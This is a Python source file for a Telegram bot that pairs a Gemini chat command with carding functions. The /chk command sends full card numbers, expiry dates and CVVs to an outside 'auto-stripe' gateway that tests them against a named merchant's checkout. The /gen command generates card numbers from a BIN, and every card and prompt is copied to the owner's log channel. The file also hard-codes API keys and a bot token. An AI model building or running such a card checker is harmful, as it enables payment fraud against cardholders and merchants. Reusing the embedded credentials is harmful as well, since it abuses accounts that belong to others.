import logging
import re
import time
import random
import requests
from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.enums import ChatAction, ParseMode

# === CONFIG ===
API_ID = 22118129
API_HASH = "43c66e3314921552d9330a4b05b18800"
BOT_TOKEN = "7252664374:AAG-DTJZN5WUQRTZd7yLrDCEIlrYZJ6xxGw"
GEMINI_API_KEY = "AIzaSyBcoZN2N2TKJeaWExZG9vT7hYU7K1--Tgw"
BOT_OWNER = "@andr0idpie9"
LOG_CHANNEL_ID = -1002843745742
GATEWAY_NAME = "Stripe Auth"
GATEWAY_URL_TEMPLATE = "https://darkboy-auto-stripe.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={}"
BIN_API_URL = "https://bins.antipublic.cc/bins/{}"
CC_REGEX = r"/chk (\d{13,16}\|\d{2}\|\d{2,4}\|\d{3,4})"

# === Logging Setup ===
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)

# === Initialize Bot ===
app = Client(
    "CombinedBot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN
)

# === Gemini Flash API Function ===
def get_gemini_flash_response(prompt: str) -> str:
    url = "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent"
    headers = {
        "Content-Type": "application/json",
        "X-goog-api-key": GEMINI_API_KEY
    }
    payload = {
        "contents": [
            {
                "parts": [{"text": prompt}]
            }
        ]
    }

    try:
        response = requests.post(url, headers=headers, json=payload)
        data = response.json()
        return data["candidates"][0]["content"]["parts"][0]["text"]
    except Exception as e:
        logging.error(f"Gemini API Error: {e}")
        return "⚠️SYSTEM PE LOAD HAI BHAI!"

# === Split long responses ===
def split_response(text: str, max_len=4000):
    parts = []
    while len(text) > max_len:
        split_at = text.rfind("\n", 0, max_len)
        if split_at == -1:
            split_at = max_len
        parts.append(text[:split_at])
        text = text[split_at:].lstrip()
    parts.append(text)
    return parts

# === BIN Info Function ===
def get_bin_info(bin_code):
    try:
        response = requests.get(BIN_API_URL.format(bin_code), timeout=10)
        if response.status_code != 200:
            return "Unknown", "Unknown", "N/A"

        data = response.json()
        brand = data.get("brand", "Unknown")
        bank = data.get("bank", "Unknown")
        country = data.get("country_name", "Unknown")
        flag = data.get("country_flag", "")

        return brand, bank, f"{country} {flag}" if country != "Unknown" else "N/A"

    except Exception as e:
        logging.error(f"BIN lookup error: {e}")
        return "Unknown", "Unknown", "N/A"

# === Generate CC Function ===
def generate_cc(bin_code, count=10):
    if count > 100:
        count = 100
    elif count < 1:
        count = 1
        
    cc_list = []
    for _ in range(count):
        # Generate random card number (bin + 10 digits)
        card_number = bin_code + ''.join([str(random.randint(0, 9)) for _ in range(10)])
        
        # Generate random expiry (month between 1-12, year between current year + 1 to +10)
        month = str(random.randint(1, 12)).zfill(2)
        year = str(random.randint(time.localtime().tm_year + 1, time.localtime().tm_year + 10))
        
        # Generate random 3-digit CVV
        cvv = str(random.randint(100, 999))
        
        cc_list.append(f"<code>{card_number}|{month}|{year}|{cvv}</code>")
    
    return cc_list

# === Log to Channel Function ===
async def log_to_channel(client: Client, log_type: str, message: Message, content: str, result: str = None):
    try:
        user = message.from_user
        user_info = f"[{user.first_name}](tg://user?id={user.id}) (`{user.id}`)"
        chat_type = message.chat.type.name
        
        if log_type == "AI":
            log_text = (
                f"📝 **New AI Prompt** from {user_info}\n"
                f"**Chat Type:** `{chat_type}`\n"
                f"**Prompt:** `{content}`\n"
                f"**AI Response:**\n{result}"
            )
        elif log_type == "CC":
            log_text = (
                f"💳 **New CC Check** from {user_info}\n"
                f"**Chat Type:** `{chat_type}`\n"
                f"**Card:** `{content}`\n"
                f"**Result:** {result}"
            )
        elif log_type == "GEN":
            log_text = (
                f"🔄 **New CC Generation** from {user_info}\n"
                f"**Chat Type:** `{chat_type}`\n"
                f"**BIN:** `{content}`\n"
                f"**Count:** {result}"
            )
        
        await client.send_message(LOG_CHANNEL_ID, log_text)
    except Exception as e:
        logging.warning(f"Failed to log message: {e}")

# === AI Handler ===
@app.on_message(filters.text & filters.command("ai", prefixes="/"))
async def ai_handler(client: Client, message: Message):
    user_input = message.text[len("/ai"):].strip()
    if not user_input:
        await message.reply("❗ Please provide a prompt after `/ai`.")
        return

    await client.send_chat_action(message.chat.id, ChatAction.TYPING)
    thinking_msg = await message.reply("🧠 *Thinking...*", quote=True)

    # Get AI response
    ai_response = get_gemini_flash_response(user_input)
    parts = split_response(ai_response)

    # Send response
    try:
        if len(parts) == 1:
            final_text = f"{parts[0]}\n\n✨ Powered by {BOT_OWNER}"
            await thinking_msg.edit(final_text)
        else:
            await thinking_msg.edit(parts[0])
            for part in parts[1:-1]:
                await message.reply(part)
            await message.reply(f"{parts[-1]}\n\n✨ Powered by {BOT_OWNER}")
    except Exception as e:
        logging.error(f"Edit/send failed: {e}")
        await message.reply("⚠️ Failed to send AI response.")

    # Log to channel
    await log_to_channel(client, "AI", message, user_input, ai_response)

# === CC Check Handler ===
@app.on_message(filters.text & filters.regex(CC_REGEX))
async def check_card(client: Client, message: Message):
    match = re.search(CC_REGEX, message.text)
    if not match:
        await message.reply("Invalid format. Use: `/chk xxxxxxxxxxxxxxxx|MM|YYYY|CVV`")
        return

    card = match.group(1)
    bin_code = card[:6]

    # Send initial "processing" message
    proc_msg = await message.reply_text(
        f"↯ Checking..\n\n"
        f"⌯ 𝐂𝐚𝐫𝐝 - <code>{card}</code>\n"
        f"⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <code>{GATEWAY_NAME}</code>\n"
        f"⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - Processing"
    )

    start_time = time.time()

    try:
        response = requests.get(GATEWAY_URL_TEMPLATE.format(card), timeout=60)
        elapsed = round(time.time() - start_time, 2)
        result_json = response.json()
        result_text = response.text.strip()

        if "declined" in result_text.lower():
            status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
        else:
            status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"

    except Exception as e:
        await proc_msg.edit(f"❌ Error: {e}")
        return

    brand, bank, country = get_bin_info(bin_code)

    final_msg = (
        f"┏━━━━━━━⍟\n"
        f"┃ {status}\n"
        f"┗━━━━━━━━━━━⊛\n\n"
        f"⌯ 𝗖𝗮𝗿𝗱\n   ↳ <code>{card}</code>\n"
        f"⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ <code>{GATEWAY_NAME}</code>\n"
        f"⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ <code>{result_text}</code>\n\n"
        f"⌯ 𝗜𝗻𝗳𝗼 ➳ {brand}\n"
        f"⌯ 𝐈𝐬𝐬𝐮𝐞𝐫 ➳ {bank}\n"
        f"⌯ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➳ {country}\n\n"
        f"⌯ 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➳ @{message.from_user.username}\n"
        f"⌯ 𝐃𝐞𝐯 ⌁ @andr0idpie9\n"
        f"⌯ 𝗧𝗶𝗺𝗲 ➳ {elapsed} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"
    )

    await proc_msg.edit(final_msg, parse_mode=ParseMode.HTML)
    
    # Log to channel
    await log_to_channel(client, "CC", message, card, status)

# === CC Generator Handler ===
@app.on_message(filters.command("gen", prefixes="/"))
async def generate_cc_handler(client: Client, message: Message):
    try:
        parts = message.text.split()
        if len(parts) < 2:
            await message.reply("❗ Please provide a BIN after <code>/gen</code>\nExample: <code>/gen 511253</code> or <code>/gen 511253 5</code>", parse_mode=ParseMode.HTML)
            return

        bin_code = parts[1]
        if not bin_code.isdigit() or len(bin_code) < 6:
            await message.reply("❗ Invalid BIN. Must be at least 6 digits.")
            return

        # Get count if provided
        count = 10  # default
        if len(parts) > 2:
            try:
                count = int(parts[2])
                if count > 1000:
                    count = 50
                    await message.reply("⚠️ Maximum count is 50. Generating 50 CCs.")
                elif count < 1:
                    count = 1
            except ValueError:
                await message.reply("❗ Invalid count. Using default 10 CCs.")

        # Show generating message
        proc_msg = await message.reply(f"🔹 Generating {count} CCs...")

        # Generate CCs
        cc_list = generate_cc(bin_code[:6], count)

        # Get BIN info
        brand, bank, country = get_bin_info(bin_code[:6])

        # Format response
        cc_text = "\n".join(cc_list)
        response_text = (
            f"<b>Generated {count} CCs 💳</b>\n\n"
            f"{cc_text}\n\n"
            f"<b>BIN-LOOKUP</b>\n"
            f"• BIN ➳ <code>{bin_code[:6]}</code>\n"
            f"• Country ➳ {country}\n"
            f"• Type ➳ {brand}\n"
            f"• Bank ➳ {bank}\n\n"
            f"⌯ 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➳ @{message.from_user.username}\n"
            f"⌯ 𝐃𝐞𝐯 ⌁ @andr0idpie9"
        )

        await proc_msg.edit(response_text, parse_mode=ParseMode.HTML)
        
        # Log to channel
        await log_to_channel(client, "GEN", message, bin_code[:6], count)

    except Exception as e:
        logging.error(f"CC generation error: {e}")
        await message.reply(f"❌ Error generating CCs: {str(e)}")

if __name__ == "__main__":
    print("🚀 Combined Bot is running with /ai, /chk and /gen commands...")
    app.run()
